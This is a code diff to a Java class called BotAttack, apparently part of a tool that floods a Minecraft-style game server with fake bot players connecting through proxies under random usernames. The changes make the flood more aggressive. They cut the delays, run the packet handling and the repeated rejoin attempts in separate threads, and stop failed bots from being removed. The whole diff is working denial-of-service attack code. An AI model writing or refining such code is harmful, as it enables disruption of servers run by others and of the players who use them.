@@ -106,7 +106,8 @@ public class BotAttack extends IAttack {
                         }
                     }
                 }
-                OtherUtils.doSleep(5 * 1000);
+
+                OtherUtils.doSleep(1000);
             }
         });
 
@@ -115,18 +116,20 @@ public class BotAttack extends IAttack {
         mainThread = new Thread(() -> {
             while (true) {
                 try {
-                    cleanClients();
                     createClients(ip, port);
-                    OtherUtils.doSleep(10 * 1000);
 
                     if (this.attack_time > 0 && (System.currentTimeMillis() - this.starttime) / 1000 > this.attack_time) {
                         for (Client c : clients) {
                             c.getSession().disconnect("");
                         }
+
                         stop();
                         return;
                     }
+
+                    OtherUtils.doSleep(5 * 1000);
                     LogUtil.doLog(0, "当前连接数: " + clients.size() + "个", "BotAttack");
+                    cleanClients();
                 } catch (Exception e) {
                     LogUtil.doLog(1, "发生错误: " + e, null);
                 }
@@ -168,7 +171,17 @@ public class BotAttack extends IAttack {
     }
 
     private void cleanClients() {
-        clients.removeIf(c -> !c.getSession().isConnected());
+        for (Client client:clients) {
+            String username = clientName.get(client);
+
+            if (!client.getSession().isConnected()) {
+                alivePlayers.remove(username);
+                clientName.remove(client);
+                clients.remove(client);
+            } else if (!alivePlayers.contains(username)) {
+                alivePlayers.add(username);
+            }
+        }
     }
 
     private void createClients(final String ip, int port) {
@@ -192,8 +205,8 @@ public class BotAttack extends IAttack {
                 Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                 String[] User = AttackManager.getRandomUser().split("@");
                 Client client = createClient(ip, port, User[0], proxy);
-                client.getSession().setReadTimeout(Math.toIntExact(ConfigUtil.ConnectDelay));
-                client.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectDelay));
+                client.getSession().setReadTimeout(5 * 1000);
+                client.getSession().setWriteTimeout(5 * 1000);
                 clientName.put(client, User[0]);
                 clients.add(client);
                 ProxyUtil.clientsProxy.put(client.getSession(), proxy);
@@ -223,7 +236,9 @@ public class BotAttack extends IAttack {
 
         client.getSession().addListener(new SessionListener() {
             public void packetReceived(PacketReceivedEvent e) {
-                handlePacket(e.getSession(), e.getPacket(), username);
+                new Thread(() -> {
+                    handlePacket(e.getSession(), e.getPacket(), username);
+                }).start();
             }
 
             public void packetSent(PacketSentEvent e) {
@@ -248,23 +263,25 @@ public class BotAttack extends IAttack {
 
                     for (String rejoinDetect:ConfigUtil.RejoinDetect) {
                         if (msg.contains(rejoinDetect)) {
-                            for (int i = 0; i < ConfigUtil.RejoinCount; i++) {
-                                Client rejoinClient = createClient(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, username, proxy);
-                                rejoinClient.getSession().setReadTimeout(Math.toIntExact(ConfigUtil.RejoinDelay));
-                                rejoinClient.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.RejoinDelay));
+                            new Thread(() -> {
+                                for (int i = 0; i < ConfigUtil.RejoinCount; i++) {
+                                    Client rejoinClient = createClient(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, username, proxy);
+                                    rejoinClient.getSession().setReadTimeout(Math.toIntExact(ConfigUtil.RejoinDelay));
+                                    rejoinClient.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.RejoinDelay));
 
-                                rejoin++;
-                                LogUtil.doLog(0,"[假人尝试重连] [" + username + "] [" + proxy + "]", "BotAttack");
-                                clientName.put(rejoinClient, username);
-                                clients.add(rejoinClient);
-                                rejoinClient.getSession().connect(false);
+                                    rejoin++;
+                                    LogUtil.doLog(0,"[假人尝试重连] [" + username + "] [" + proxy + "]", "BotAttack");
+                                    clientName.put(rejoinClient, username);
+                                    clients.add(rejoinClient);
+                                    rejoinClient.getSession().connect(false);
 
-                                OtherUtils.doSleep(ConfigUtil.RejoinDelay);
+                                    OtherUtils.doSleep(ConfigUtil.RejoinDelay);
 
-                                if (rejoinClient.getSession().hasFlag("join") || rejoinClient.getSession().hasFlag("login")) {
-                                    break;
+                                    if (rejoinClient.getSession().hasFlag("join") || rejoinClient.getSession().hasFlag("login")) {
+                                        break;
+                                    }
                                 }
-                            }
+                            }).start();
                         }
                     }
                 } else if (ConfigUtil.ShowFails) {
@@ -273,10 +290,6 @@ public class BotAttack extends IAttack {
                 }
 
                 failed++;
-                alivePlayers.remove(username);
-
-                client.getSession().disconnect("");
-                clients.remove(client);
             }
         });
         return client;
